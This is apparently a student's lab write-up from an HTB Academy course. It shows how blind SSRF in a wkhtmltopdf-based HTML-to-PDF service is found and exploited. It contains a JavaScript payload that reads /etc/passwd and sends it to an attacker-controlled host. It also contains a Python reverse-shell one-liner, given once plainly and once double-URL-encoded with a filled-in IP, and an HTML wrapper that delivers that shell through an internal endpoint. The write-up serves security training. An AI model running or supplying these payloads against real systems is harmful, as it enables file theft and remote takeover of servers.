![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/db997a45-98bb-4205-9da5-5dd6ef654b87)


If we upload various HTML files and inspect the responses, we will notice that the application returns the same response 
regardless of the structure and content of the submitted files. In addition, 
we cannot observe any response related to the processing of the submitted HTML
file on the front end. Should we conclude that the application is not vulnerable to SSRF? 
Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/846d0f12-2ee4-4731-a640-94f1d78edf3f)


Let us create an HTML file containing a link to a service under our control to test 
if the application is vulnerable to a blind SSRF vulnerability. 
```bash
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```
In this case it will be our IP and netcat listener port.
After sending file we receive this:
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/60752885-42cc-46b4-b1cd-e76decf48b59)

Confirming SSRF vulnerability, By inspecting the request, we notice wkhtmltopdf in the User-Agent. 
If we browse wkhtmltopdf's downloads webpage,
the below statement catches our attention:

Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, 
it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.

Great, we can execute JavaScript in wkhtmltopdf! 
Let us leverage this functionality to read a local file by creating the following HTML document.
```bash
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://IP:PORT/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```
We will recieve response in base64 format:
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/06f3f7df-8d28-49af-a31c-c347da213c3b)

## Bash shell
We need this main code:

`export RHOST="NC_IP";export RPORT="PORT";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

Then we have to double URL encude it will like this:

`export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527`

Then we will copy and paste payload to main html code:
```bash
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=PAYLOAD", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

